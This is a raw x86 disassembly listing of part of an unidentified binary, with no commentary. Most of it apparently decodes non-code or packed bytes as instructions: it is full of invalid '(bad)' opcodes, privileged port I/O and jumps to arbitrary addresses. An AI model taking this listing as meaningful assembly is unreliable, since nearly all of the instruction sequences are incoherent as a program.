  410a77:	mul    DWORD PTR [edx+0x3d9e5c5d]
  410a7d:	inc    ebp
  410a7e:	jns    0x410a81
  410a80:	cld    
  410a81:	and    ecx,DWORD PTR [ecx+0x71b69df3]
  410a87:	pop    esp
  410a88:	mov    DWORD PTR [edi-0x2bb21059],esp
  410a8e:	(bad)  
  410a8f:	jnp    0x410ad2
  410a91:	push   ds
  410a92:	mov    DWORD PTR [ebx],edx
  410a94:	dec    ecx
  410a95:	outs   dx,DWORD PTR ds:[esi]
  410a96:	ss sbb edx,esp
  410a99:	cmp    DWORD PTR [ebx-0x10],ebx
  410a9c:	mov    esp,0xe5533ab6
  410aa1:	fadd   DWORD PTR [ebx]
  410aa3:	add    BYTE PTR [eax],dl
  410aa5:	push   esp
  410aa6:	dec    esp
  410aa7:	ins    DWORD PTR es:[edi],dx
  410aa8:	call   0xd867b7c3
  410aad:	outs   dx,BYTE PTR ds:[esi]
  410aae:	fistp  QWORD PTR [ebp+esi*8+0x2d64e740]
  410ab5:	jns    0x410ab9
  410ab7:	sbb    BYTE PTR [eax+0x4b],cl
  410aba:	xor    bh,0xd0
  410abd:	inc    esi
  410abe:	in     eax,0x44
  410ac0:	sub    eax,0xee1a5820
  410ac5:	fadd   DWORD PTR [edx+0x51]
  410ac8:	sbb    ebp,edi
  410aca:	or     al,0xbe
  410acc:	adc    DWORD PTR [edx+0x69],eax
  410acf:	mov    bh,0xde
  410ad1:	shr    BYTE PTR [ebp-0x63],cl
  410ad4:	xchg   ecx,eax
  410ad5:	add    edx,DWORD PTR ds:0xc1dbad9
  410adb:	push   esp
  410adc:	(bad)  
  410add:	jo     0x410b08
  410adf:	xchg   ebp,eax
  410ae0:	inc    eax
  410ae1:	inc    edx
  410ae2:	sub    ebx,DWORD PTR [ecx+0x7efe96c6]
  410ae8:	ret    0x54af
  410aeb:	jmp    0x8b84:0x40e90a87
  410af2:	pop    ebx
  410af3:	add    BYTE PTR [ebp+0x3e39791f],dl
  410af9:	inc    ebx
  410afa:	fdivr  DWORD PTR [edi-0x32]
  410afd:	xchg   ecx,eax
  410afe:	loope  0x410acf
  410b00:	xchg   edx,eax
  410b01:	int3   
  410b02:	repz iret 
  410b04:	in     eax,dx
  410b05:	push   edi
  410b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b07:	inc    esp
  410b08:	add    al,0xce
  410b0a:	adc    eax,0x85a8c990
  410b0f:	fisubr WORD PTR [edi]
  410b11:	aad    0x9d
  410b13:	rol    BYTE PTR [ecx-0x408d7eea],0xe0
  410b1a:	push   cs
  410b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b1c:	(bad)  
  410b1d:	and    eax,0xfdecc32
  410b22:	adc    BYTE PTR fs:[ebx],ah
  410b25:	test   DWORD PTR [ebx+0x51],ecx
  410b28:	(bad)  
  410b29:	icebp  
  410b2a:	(bad)  
  410b2b:	adc    DWORD PTR [ecx],edi
  410b2d:	aas    
  410b2e:	cdq    
  410b2f:	out    dx,eax
  410b30:	shr    al,0x8e
  410b33:	outs   dx,BYTE PTR ds:[esi]
  410b34:	add    eax,0xbcfb2107
  410b39:	ins    BYTE PTR es:[edi],dx
  410b3a:	jg     0x410ac0
  410b3c:	hlt    
  410b3d:	add    al,0x7f
  410b3f:	imul   ebx,DWORD PTR [ebp+0x38],0x34ab75a8
  410b46:	sar    BYTE PTR [esi+0x73],1
  410b49:	in     al,dx
  410b4a:	inc    ebp
  410b4b:	out    dx,al
  410b4c:	add    DWORD PTR [edx-0x4f],0x6c
  410b50:	sbb    esp,edi
  410b52:	xor    al,0x8b
  410b54:	lods   eax,DWORD PTR ds:[esi]
  410b55:	cmp    eax,0x273c6503
  410b5a:	aam    0x89
  410b5c:	or     ah,bl
  410b5e:	icebp  
  410b5f:	cdq    
  410b60:	not    BYTE PTR [edi]
  410b62:	sub    dl,BYTE PTR [esi]
  410b64:	inc    edx
  410b65:	push   esi
  410b66:	shl    BYTE PTR [esi],0xd9
  410b69:	push   cs
  410b6a:	inc    ebp
  410b6b:	sbb    ebp,ecx
  410b6d:	xchg   edx,eax
  410b6e:	in     al,0x9b
  410b70:	cs sti 
  410b72:	add    DWORD PTR [eax+esi*1],eax
  410b75:	leave  
  410b76:	inc    edx
  410b77:	loope  0x410b3e
  410b79:	jg     0x410b02
  410b7b:	ins    BYTE PTR es:[edi],dx
  410b7c:	push   ds
  410b7d:	popa   
  410b7e:	cmp    cl,ch
  410b80:	ror    BYTE PTR [edi-0x23bc74a7],0x2
  410b87:	repnz mov ds:0xf073ce85,al
  410b8d:	pop    ebx
  410b8e:	and    al,0x50
  410b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b91:	call   0xdeded96c
  410b96:	jns    0x410bc1
  410b98:	imul   esi,DWORD PTR [edx],0xffffff8a
  410b9b:	dec    esi
  410b9c:	jg     0x410ba7
  410b9e:	jp     0x410b52
  410ba0:	mov    BYTE PTR [ecx],bh
  410ba2:	cmp    eax,0x77c2887
  410ba7:	fwait
  410ba8:	push   edi
  410ba9:	sahf   
  410baa:	loopne 0x410c0a
  410bac:	pop    ecx
  410bad:	mov    cl,0x63
  410baf:	int    0x19
  410bb1:	out    0xab,eax
  410bb3:	ins    DWORD PTR es:[edi],dx
  410bb4:	or     eax,0x75dbcb9c
  410bb9:	cmp    bh,bl
  410bbb:	mov    ebp,0xed8df54b
  410bc0:	sahf   
  410bc1:	sub    eax,0xc0f96e7b
  410bc6:	mov    al,ah
  410bc8:	adc    al,0xb3
  410bca:	popf   
  410bcb:	xor    BYTE PTR [esp+ecx*4-0x2c],ah
  410bcf:	adc    al,0x17
  410bd1:	jecxz  0x410bb8
  410bd3:	jns    0x410c1b
  410bd5:	mov    edx,DWORD PTR [ecx-0x32]
  410bd8:	push   ebx
  410bd9:	jmp    0x7d42:0x313a92af
  410be0:	xor    edx,edx
  410be2:	jecxz  0x410c1a
  410be4:	stos   DWORD PTR es:[edi],eax
  410be5:	pushf  
  410be6:	stos   BYTE PTR es:[edi],al
  410be7:	xchg   edi,eax
  410be8:	xor    BYTE PTR [edi+0x55213d5a],al
  410bee:	in     eax,dx
  410bef:	cmp    bl,BYTE PTR [ebp-0x7c]
  410bf2:	and    al,0xf3
  410bf4:	push   ebp
  410bf5:	sub    al,0x42
  410bf7:	jmp    0x7bcb:0x5409759f
  410bfe:	jp     0x410bbf
  410c00:	loope  0x410bad
  410c02:	std    
  410c03:	int3   
  410c04:	adc    dh,ah
  410c06:	push   edx
  410c07:	fcomp  QWORD PTR [esi]
  410c09:	push   ecx
  410c0a:	bound  ecx,QWORD PTR [edi-0x33]
  410c0d:	or     DWORD PTR [ebp+0x1031c7c6],ebp
  410c13:	push   ebp
  410c14:	jbe    0x410c8f
  410c16:	out    dx,al
  410c17:	push   ds
  410c18:	inc    ebp
  410c19:	hlt    
  410c1a:	outs   dx,DWORD PTR ds:[esi]
  410c1b:	add    BYTE PTR [ebp-0x57],ah
  410c1e:	jne    0x410c08
  410c20:	lods   al,BYTE PTR ds:[esi]
  410c21:	sbb    eax,0x248d1d9a
  410c26:	loope  0x410c22
  410c28:	push   es
  410c29:	js     0x410bc6
  410c2b:	push   cs
  410c2c:	dec    edi
  410c2d:	adc    ah,BYTE PTR [ecx]
  410c2f:	and    DWORD PTR [edi+0x8dbc163],edx
  410c35:	xor    eax,0xfeabddaa
  410c3a:	pop    es
  410c3b:	retf   0x441e
  410c3e:	or     eax,0xc0b0ec10
  410c43:	dec    edx
  410c44:	adc    al,0x22
  410c46:	jge    0x410cc2
  410c48:	jg     0x410bea
  410c4a:	mov    ds:0x76f3f201,eax
  410c4f:	ds xor eax,0x9d268946
  410c55:	and    dh,BYTE PTR [edx]
  410c57:	xor    bl,bh
  410c59:	dec    ecx
  410c5a:	xchg   ecx,eax
  410c5b:	mov    ds:0x5f46978b,al
  410c60:	sub    eax,edx
  410c62:	fld    QWORD PTR [ebp+0x7efebb48]
  410c68:	sbb    BYTE PTR [esi],bl
  410c6a:	je     0x410c04
  410c6c:	jb     0x410c8c
  410c6e:	pop    DWORD PTR [ecx+0x2b07bc53]
  410c74:	jge    0x410c5a
  410c76:	pop    ebp
  410c77:	cmp    dl,BYTE PTR [eax-0x3a]
  410c7a:	jmp    0x7ffa886b
  410c7f:	in     al,0x83
  410c81:	loop   0x410c18
  410c83:	ins    BYTE PTR es:[edi],dx
  410c84:	jmp    0xac83ede4
  410c89:	inc    esp
  410c8a:	xchg   ebx,eax
  410c8b:	imul   esi,DWORD PTR [edi-0x28d50f4e],0xffffff9e
  410c92:	cmc    
  410c93:	scas   eax,DWORD PTR es:[edi]
  410c94:	stos   DWORD PTR es:[edi],eax
  410c95:	xchg   DWORD PTR ds:0x82a87805,eax
  410c9b:	sahf   
  410c9c:	mov    BYTE PTR [ebx],0x2e
  410c9f:	jp     0x410c5c
  410ca1:	lea    ebp,[edi+0x3e]
  410ca4:	scas   al,BYTE PTR es:[edi]
  410ca5:	and    edi,DWORD PTR [ebx+0x781a763c]
  410cab:	pusha  
  410cac:	out    dx,al
  410cad:	popf   
  410cae:	inc    ecx
  410caf:	sar    ecx,cl
  410cb1:	or     edi,DWORD PTR [esi]
  410cb3:	enter  0xf17b,0x1b
  410cb7:	pop    eax
  410cb8:	mov    edx,DWORD PTR [edi+0x73fa22d2]
  410cbe:	out    dx,al
  410cbf:	cmc    
  410cc0:	mov    bh,0x1a
  410cc2:	les    ebx,FWORD PTR [edi]
  410cc4:	clc    
  410cc5:	test   BYTE PTR [esi+0x73eb99bf],bh
  410ccb:	pushf  
  410ccc:	out    0xfe,al
  410cce:	jo     0x410c9e
  410cd0:	adc    eax,0xf677be4
  410cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd6:	std    
  410cd7:	push   ebx
  410cd8:	daa    
  410cd9:	xchg   esp,eax
  410cda:	cli    
  410cdb:	xchg   BYTE PTR [ecx],bl
  410cdd:	cmp    BYTE PTR [eax+0x45ec0371],ch
  410ce3:	data16 ja 0x410cec
  410ce6:	ffreep st(1)
  410ce8:	or     DWORD PTR [ecx-0xc8c8180],ebx
  410cee:	ror    BYTE PTR [edx-0x33a86ea0],cl
  410cf4:	add    BYTE PTR [edx+0xffea189],bh
  410cfa:	push   ecx
  410cfb:	shl    BYTE PTR [esi-0x37f0e125],cl
  410d01:	(bad)  [edi-0x5]
  410d04:	nop
  410d05:	stos   BYTE PTR es:[edi],al
  410d06:	dec    esi
  410d07:	add    al,0x18
  410d09:	push   esp
  410d0a:	xor    eax,0xc79d4409
  410d0f:	hlt    
  410d10:	push   ss
  410d11:	sbb    ch,BYTE PTR [edi-0x48]
  410d14:	mov    ?,WORD PTR [esp+edi*4-0x6e]
  410d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d19:	mov    ds:0x10d747e9,al
  410d1e:	mov    bh,al
  410d20:	rep outs dx,BYTE PTR ds:[esi]
  410d22:	pop    es
  410d23:	pop    edi
  410d24:	pop    edx
  410d25:	adc    eax,0xb80af1d
  410d2a:	rcr    BYTE PTR [ebx],1
  410d2c:	cmp    eax,0xdb9bbc54
  410d31:	std    
  410d32:	stos   DWORD PTR es:[edi],eax
  410d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d34:	add    al,0xee
  410d36:	dec    edx
  410d37:	sbb    ecx,esp
  410d39:	(bad)  
  410d3a:	lock cmc 
  410d3c:	ror    ebx,cl
  410d3e:	inc    ebp
  410d3f:	xchg   ebx,eax
  410d40:	xchg   ecx,eax
  410d41:	adc    al,0x8c
  410d43:	inc    edx
  410d44:	mov    DWORD PTR [eax],ebp
  410d46:	out    0xe5,al
  410d48:	mov    cl,ah
  410d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d4b:	dec    ebx
  410d4c:	adc    al,0xf8
  410d4e:	mov    edi,0xbbf95a52
  410d53:	mov    ebp,0xbde1ada3
  410d58:	hlt    
  410d59:	xchg   edx,eax
  410d5a:	mov    ch,0xa8
  410d5c:	call   0x76f4ae40
  410d61:	test   BYTE PTR [ecx+esi*2-0x45d8f6],al
  410d68:	mov    ch,0x63
  410d6a:	push   ebx
  410d6b:	call   0x9147ec92
  410d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d72:	and    ah,BYTE PTR [eax+0x6a99e099]
  410d78:	and    eax,0x6a9b81ed
  410d7d:	scas   eax,DWORD PTR es:[edi]
  410d7e:	fdivr  st,st(1)
  410d80:	or     DWORD PTR [ecx+edi*8-0xf711d54],ebp
  410d87:	pandn  mm1,QWORD PTR [ebx]
  410d8a:	sahf   
  410d8b:	mov    bl,0x42
  410d8d:	scas   eax,DWORD PTR es:[edi]
  410d8e:	ss dec ecx
  410d90:	lock push 0x8b616dce
  410d96:	sub    al,0x95
  410d98:	jmp    0x5490:0xe6026b37
  410d9f:	dec    edx
  410da0:	or     DWORD PTR [eax-0x2cbb005a],ecx
  410da6:	pop    ecx
  410da7:	or     eax,0xd8d010a4
  410dac:	ficomp DWORD PTR [edi-0x7717dba7]
  410db2:	jmp    0x1093:0x3df13d0a
  410db9:	enter  0x1c31,0x13
  410dbd:	sahf   
  410dbe:	dec    esi
  410dbf:	xchg   esp,eax
  410dc0:	outs   dx,DWORD PTR ds:[esi]
  410dc1:	outs   dx,DWORD PTR ds:[esi]
  410dc2:	dec    edi
  410dc3:	push   cs
  410dc4:	repnz mov cl,0x51
  410dc7:	mov    al,0x5d
  410dc9:	(bad)
  410dcc:	loop   0x410db7
  410dce:	inc    ebp
  410dcf:	inc    DWORD PTR [edx]
  410dd1:	stc    
  410dd2:	cli    
  410dd3:	or     cl,ch
  410dd5:	std    
  410dd6:	lahf   
  410dd7:	cmp    BYTE PTR [ebp-0x59c15c82],dh
  410ddd:	jo     0x410e57
  410ddf:	push   esi
  410de0:	sahf   
  410de1:	and    bl,dh
  410de3:	mov    ds:0x8ba03062,al
  410de8:	push   ebp
  410de9:	or     cl,ch
  410deb:	out    dx,eax
  410dec:	add    eax,DWORD PTR [eax]
  410dee:	add    BYTE PTR [edi-0x6],al
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0xba826ee8
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410d99
  410e08:	mov    WORD PTR [edx-0x54],ss
  410e0b:	sbb    BYTE PTR [esi+0x509269b1],dh
  410e11:	add    bl,BYTE PTR [edx+0x52]
  410e14:	iret   
  410e15:	and    esi,0x9471b75f
  410e1b:	adc    BYTE PTR [esi-0x14e02913],0x91
  410e22:	pop    esp
  410e23:	xlat   BYTE PTR ds:[ebx]
  410e24:	xor    al,0xeb
  410e26:	js     0x410e60
  410e28:	shr    cl,cl
  410e2a:	aad    0xfd
  410e2c:	sub    DWORD PTR [ebp+ebp*4-0x3e],0x2b7e1b86
  410e34:	cli    
  410e35:	mov    ebx,0xf67a21ae
  410e3a:	xor    DWORD PTR [esi],esp
  410e3c:	or     dl,bh
  410e3e:	pop    ss
  410e3f:	push   0x3e
  410e41:	and    al,0xb3
  410e43:	xchg   ebx,eax
  410e44:	mov    esi,0x64122239
  410e49:	mov    eax,ds:0x9b3f26f6
  410e4e:	hlt    
  410e4f:	inc    ebx
  410e50:	pop    ebx
  410e51:	pop    ebp
  410e52:	inc    ecx
  410e53:	cmp    al,0x8a
  410e55:	dec    edi
  410e56:	fadd   DWORD PTR [ecx+0x67d66c32]
  410e5c:	push   cs
  410e5d:	mov    al,ds:0x6b7e8671
  410e62:	mov    ecx,?
  410e64:	sub    eax,0xf8403041
  410e69:	or     DWORD PTR [edx],edi
  410e6b:	lods   eax,DWORD PTR ds:[esi]
  410e6c:	mov    DWORD PTR [edx-0x70],ecx
  410e6f:	mov    edx,0xc9eab30f
  410e74:	inc    BYTE PTR [esi-0x39]
  410e77:	shl    BYTE PTR [esi-0x1b],0xc
  410e7b:	(bad)  
  410e7c:	lods   al,BYTE PTR ds:[esi]
  410e7d:	xchg   DWORD PTR [ebp-0x3f],ecx
  410e80:	cmp    bh,BYTE PTR [edi]
  410e82:	pop    es
  410e83:	int    0x9
  410e85:	adc    al,BYTE PTR [ebx+0x1f]
  410e88:	push   0x61
  410e8a:	sub    dl,BYTE PTR [ebx+0x4e635d30]
  410e90:	(bad)  
  410e91:	push   esp
  410e92:	push   cs
  410e93:	lock add bh,BYTE PTR [ebp+0x25]
  410e97:	add    eax,0x8758782a
  410e9c:	add    ah,BYTE PTR ds:0xb7145e76
  410ea2:	or     eax,DWORD PTR [eax+0x72f0f244]
  410ea8:	adc    cl,ah
  410eaa:	dec    edx
  410eab:	lds    ecx,FWORD PTR [eax]
  410ead:	(bad)  
  410eae:	in     eax,dx
  410eaf:	add    ch,BYTE PTR [ebx+0x42]
  410eb2:	daa    
  410eb3:	aaa    
  410eb4:	pop    ebx
  410eb5:	mov    bh,0xff
  410eb7:	sub    eax,0x33c9e98
  410ebc:	fwait
  410ebd:	jo     0x410ef6
  410ebf:	pusha  
  410ec0:	fist   DWORD PTR [ebp+0x5ca27ade]
  410ec6:	and    eax,0x33b102f0
  410ecb:	adc    DWORD PTR [edi+0x5477de0],ebx
  410ed1:	mov    cl,0x26
  410ed3:	mov    dh,0x70
  410ed5:	and    bl,cl
  410ed7:	mov    ds:0x2a8fafee,eax
  410edc:	(bad)  
  410edd:	mov    dl,0x32
  410edf:	adc    BYTE PTR [edx+0x78360f6],bl
  410ee5:	lea    esi,[eax+esi*1]
  410ee8:	out    dx,eax
  410ee9:	pop    ds
  410eea:	sbb    ebx,0x38
  410eed:	stos   BYTE PTR es:[edi],al
  410eee:	pop    ebx
  410eef:	add    BYTE PTR [edx],bh
  410ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef2:	cs xor esi,0xcc6e41cf
  410ef9:	xchg   ebx,eax
  410efa:	mov    DWORD PTR [edi-0xb],0x72274c3f
  410f01:	cs ja  0x410f56
  410f04:	fcmovb st,st(5)
  410f06:	xor    al,0x52
  410f08:	(bad)  
  410f09:	xor    al,0x28
  410f0b:	mov    ecx,edx
  410f0d:	mov    DWORD PTR [eax+0x11],edi
  410f10:	ror    ah,1
  410f12:	push   0x48
  410f14:	adc    dh,cl
  410f16:	inc    ebx
  410f17:	enter  0xa226,0xe2
  410f1b:	pop    edx
  410f1c:	adc    al,0x79
  410f1e:	shr    DWORD PTR [eax-0x7e697fde],1
  410f24:	scas   al,BYTE PTR es:[edi]
  410f25:	call   FWORD PTR [esi+0x2b]
  410f28:	cdq    
  410f29:	mov    eax,ds:0x47af4646
  410f2e:	xchg   esi,eax
  410f2f:	rcr    BYTE PTR [esi-0x7d],cl
  410f32:	or     esi,DWORD PTR [ebx-0x4fa6bb4d]
  410f38:	xor    DWORD PTR [ebp*1+0x4604420d],eax
  410f3f:	popa   
  410f40:	out    dx,al
  410f41:	ror    BYTE PTR [eax],0xf9
  410f44:	(bad)  
  410f45:	mov    ebp,0x378fe827
  410f4a:	push   ebp
  410f4b:	xor    bh,ah
  410f4d:	pop    eax
  410f4e:	cmp    al,0xdc
  410f50:	or     al,0x23
  410f52:	dec    esi
  410f53:	pop    edi
  410f54:	pop    ebp
  410f55:	cwde   
  410f56:	mov    ebx,0x392882f0
  410f5b:	(bad)  
  410f5d:	pop    ebp
  410f5e:	jns    0x410ef5
  410f60:	adc    dl,bh
  410f62:	or     DWORD PTR [esp+esi*4+0x35],edi
  410f66:	push   esi
  410f67:	stos   BYTE PTR es:[edi],al
  410f68:	xor    al,0x22
  410f6a:	pop    ebp
  410f6b:	aas    
  410f6c:	scas   al,BYTE PTR es:[edi]
  410f6d:	dec    ebx
  410f6e:	push   ss
  410f6f:	inc    ebx
  410f70:	in     eax,dx
  410f71:	dec    esp
  410f72:	fist   WORD PTR [ebp+0x1b5515f9]
  410f78:	jne    0x410f67
  410f7a:	push   cs
  410f7b:	sbb    BYTE PTR [esp+ebp*8],al
  410f7e:	xor    dh,dh
  410f80:	test   al,0xfb
  410f82:	mov    ebp,0x42a24913
  410f87:	das    
  410f88:	inc    esi
  410f89:	fwait
  410f8a:	pop    ss
  410f8b:	call   0xa575:0x7b4313bf
  410f92:	push   ebp
  410f93:	outs   dx,DWORD PTR ds:[esi]
  410f94:	je     0x411003
  410f96:	adc    DWORD PTR [ebp+0x1a],0xffffff9a
  410f9a:	xchg   DWORD PTR [edi],eax
  410f9c:	sar    DWORD PTR [edi],0xcc
  410f9f:	xor    eax,0x78ebf0fb
  410fa4:	jge    0x410f86
  410fa6:	ret    
  410fa7:	pop    eax
  410fa8:	enter  0x2676,0x4d
  410fac:	sti    
  410fad:	outs   dx,BYTE PTR ds:[esi]
  410fae:	clc    
  410faf:	add    ecx,DWORD PTR ds:0xae965f26
  410fb5:	fucom  st(1)
  410fb7:	add    cl,BYTE PTR [edx+0x7d]
  410fba:	and    bh,BYTE PTR [ebx+0x1e598fb0]
  410fc0:	cli    
  410fc1:	push   eax
  410fc2:	add    dh,BYTE PTR [ecx]
  410fc4:	sub    eax,0x983a3684
  410fc9:	ror    ebx,cl
  410fcb:	inc    eax
  410fcc:	outs   dx,DWORD PTR ds:[esi]
  410fcd:	ret    
  410fce:	repz sar DWORD PTR [edx-0x53a7d6da],cl
  410fd5:	add    DWORD PTR [edx-0x64],edi
  410fd8:	shr    dh,0x4b
  410fdb:	dec    eax
  410fdc:	adc    eax,0xe15c01c5
  410fe1:	xor    edx,DWORD PTR [eax+0x63e81385]
  410fe7:	dec    edi
  410fe8:	(bad)  
  410fe9:	lock cmp eax,0x3ca73dd
  410fef:	mov    bh,0x76
  410ff1:	cmp    eax,0x8192697d
  410ff6:	sub    DWORD PTR [ebp+0x3eb56e00],ebp
  410ffc:	mov    ds:0x3f239f80,al
  411001:	mov    dl,0x83
  411003:	ret    
  411004:	(bad)  
  411005:	shl    DWORD PTR [esi],1
  411007:	add    bh,BYTE PTR [edi]
  411009:	sub    al,ah
  41100b:	mul    cl
  41100d:	or     esp,DWORD PTR [esi-0x25]
  411010:	add    eax,0x4aa68878
  411015:	cld    
  411016:	out    dx,eax
  411017:	pop    ebp
  411018:	sbb    eax,0xb7975cb2
  41101d:	sahf   
  41101e:	sbb    DWORD PTR [ebp+0x13],0xffffff82
  411022:	push   esp
  411023:	jbe    0x411015
  411025:	in     al,dx
  411026:	sbb    BYTE PTR es:[edx+0x0],cl
  41102a:	mov    eax,ds:0xb48cda77
  41102f:	or     eax,ecx
  411031:	iret   
  411032:	stos   DWORD PTR es:[edi],eax
  411033:	cmp    ebx,ebp
  411035:	dec    edi
  411036:	mov    dl,0x22
  411038:	sbb    dl,BYTE PTR ds:0x8396d122
  41103e:	cmp    al,0x81
  411040:	lods   al,BYTE PTR ds:[esi]
  411041:	imul   ebp,DWORD PTR [ebx-0x3e],0xffffff81
  411045:	fsubp  st(5),st
  411047:	or     BYTE PTR [ecx-0x17b2f4af],0xa3
  41104e:	(bad)  
  41104f:	ds jl  0x411001
  411052:	mov    ch,0x53
  411054:	fnstenv [ecx+0x9c34a03]
  41105a:	not    DWORD PTR [ecx-0xa]
  41105d:	jecxz  0x41103a
  41105f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411061:	(bad)  
  411062:	sub    ebx,ebp
  411064:	mov    al,0xa0
  411066:	mov    ds:0x2c8c3fd8,eax
  41106b:	mov    dl,0x4b
  41106d:	popa   
  41106e:	push   cs
  41106f:	xchg   ebx,eax
  411070:	cli    
  411071:	and    cl,al
  411073:	sar    bl,cl
  411075:	or     al,BYTE PTR [ecx]
  411077:	aam    0xc9
  411079:	sbb    DWORD PTR [edi+0x5a797c2c],ebx
  41107f:	adc    eax,0x5141c56
  411084:	xchg   edx,eax
  411085:	sahf   
  411086:	(bad)  
  411087:	or     al,0x1b
  411089:	sbb    BYTE PTR [ecx+0x5664e253],bl
  41108f:	pop    ebx
  411090:	leave  
  411091:	in     al,dx
  411092:	mov    eax,0x41bbd5f5
  411097:	hlt    
  411098:	add    ebx,DWORD PTR [edi+0x1]
  41109b:	adc    DWORD PTR [ecx],eax
  41109d:	and    eax,0x9c2c15b8
  4110a2:	mov    ds:0x38b536f2,eax
  4110a7:	dec    esi
  4110a8:	rcr    DWORD PTR [ebx+ebx*2+0x51],cl
  4110ac:	cmp    eax,0xfab3de
  4110b1:	dec    esp
  4110b2:	sub    DWORD PTR [ecx-0xe711f3f],edx
  4110b8:	push   cs
  4110b9:	and    BYTE PTR [edx+0xe0f8dd0],0x1c
  4110c0:	imul   ecx,ecx,0x49
  4110c3:	int3   
  4110c4:	jge    0x4110c2
  4110c6:	lahf   
  4110c7:	cld    
  4110c8:	rcl    DWORD PTR [edx-0x73e9fc06],cl
  4110ce:	sbb    al,0x98
  4110d0:	into   
  4110d1:	jns    0x411083
  4110d3:	adc    bh,dh
  4110d5:	das    
  4110d6:	retf   
  4110d7:	in     al,0x44
  4110d9:	lock mov bl,al
  4110dc:	aam    0x4f
  4110de:	jno    0x4110de
  4110e0:	add    eax,esi
  4110e2:	das    
  4110e3:	test   al,0x28
  4110e5:	push   eax
  4110e6:	lea    ebp,[edi+eax*8-0x2168eed7]
  4110ed:	ds dec ebx
  4110ef:	inc    ecx
  4110f0:	shr    edi,1
  4110f2:	or     ecx,DWORD PTR [eax]
  4110f4:	(bad)
  4110f8:	fsub   QWORD PTR [ebx-0x7e]
  4110fb:	mov    ds:0xfbe8c764,eax
  411100:	xor    dl,dh
  411102:	aam    0xf7
  411104:	sbb    dh,bl
  411106:	cmp    edx,DWORD PTR [eax]
  411108:	ins    BYTE PTR es:[edi],dx
  411109:	loopne 0x41113e
  41110b:	sub    BYTE PTR [edx+0x7a],cl
  41110e:	dec    esp
  41110f:	xlat   BYTE PTR ds:[ebx]
  411110:	xor    eax,0xb1b85277
  411115:	data16 sar BYTE PTR [ecx],cl
  411118:	jns    0x4110eb
  41111a:	mov    ds:0xd399130d,eax
  41111f:	sub    ecx,esi
  411121:	clc    
  411122:	lods   al,BYTE PTR ds:[esi]
  411123:	lds    esi,FWORD PTR cs:[edx]
  411126:	scas   eax,DWORD PTR es:[edi]
  411127:	push   esi
  411128:	and    eax,0xf5664441
  41112d:	into   
  41112e:	and    esp,ebx
  411130:	out    dx,eax
  411131:	jbe    0x411127
  411133:	adc    DWORD PTR [esi+0x74],ebp
  411136:	cmp    esp,DWORD PTR [edx-0x30e26773]
  41113c:	xchg   ecx,eax
  41113d:	lds    eax,FWORD PTR [esi-0x3aaaae4b]
  411143:	pop    ss
  411144:	push   esp
  411145:	ret    
  411146:	sub    ebx,DWORD PTR [ecx-0x1]
  411149:	call   0xaf23:0xe07179f9
  411150:	cmp    bl,BYTE PTR [edi]
  411152:	test   al,0xf8
  411154:	or     DWORD PTR [ebp-0x3145d8b1],0xad37d86b
  41115e:	adc    dl,BYTE PTR [edx-0x6317523]
  411164:	stos   DWORD PTR es:[edi],eax
  411165:	mov    DWORD PTR [ebp+0x525459a5],ecx
  41116b:	push   edi
  41116c:	adc    eax,DWORD PTR [esi+edi*1-0x20]
  411170:	(bad)  
  411171:	pop    edx
  411172:	push   eax
  411173:	ja     0x4111b5
  411175:	retf   0xed4f
  411178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411179:	dec    BYTE PTR [ebx+esi*2-0x46]
  41117d:	loope  0x41115a
  41117f:	xchg   ebx,eax
  411180:	cli    
  411181:	sbb    dl,cl
  411183:	scas   al,BYTE PTR es:[edi]
  411184:	out    dx,eax
  411185:	pop    edx
  411187:	scas   eax,DWORD PTR es:[edi]
  411188:	imul   esp,DWORD PTR [ebp-0x5e903ebc],0xec93786b
  411192:	icebp  
  411193:	enter  0x3ec3,0x71
  411197:	inc    edi
  411198:	aaa    
  411199:	std    
  41119a:	iret   
  41119b:	adc    al,bl
  41119d:	out    0x55,eax
  41119f:	stos   BYTE PTR es:[edi],al
  4111a0:	sahf   
  4111a1:	pop    esi
  4111a2:	fwait
  4111a3:	jb     0x41116c
  4111a5:	adc    ebx,DWORD PTR [eax-0x81e1f6d]
  4111ab:	in     al,dx
  4111ac:	fwait
  4111ad:	mov    bl,0x82
  4111af:	cmp    al,0x60
  4111b1:	push   ebp
  4111b2:	push   esp
  4111b3:	pop    esi
  4111b4:	pop    edi
  4111b5:	out    dx,eax
  4111b6:	loop   0x4111d5
  4111b8:	dec    esi
  4111b9:	and    edi,esp
  4111bb:	(bad)  
  4111bc:	les    ebx,FWORD PTR [ecx-0xe]
  4111bf:	out    0x21,al
  4111c1:	push   esp
  4111c2:	sub    al,0x1e
  4111c4:	mov    dh,0x5b
  4111c6:	pusha  
  4111c7:	dec    edi
  4111c8:	lock (bad) 
  4111ca:	fistp  DWORD PTR [ecx-0x246e33c2]
  4111d0:	lods   eax,DWORD PTR ds:[esi]
  4111d1:	into   
  4111d2:	cwde   
  4111d3:	not    ch
  4111d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d6:	inc    edx
  4111d7:	xchg   edi,eax
  4111d8:	xchg   ebx,eax
  4111d9:	hlt    
  4111da:	js     0x411179
  4111dc:	pop    esp
  4111dd:	inc    esp
  4111de:	xor    eax,ecx
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp-0x34bca301],cl
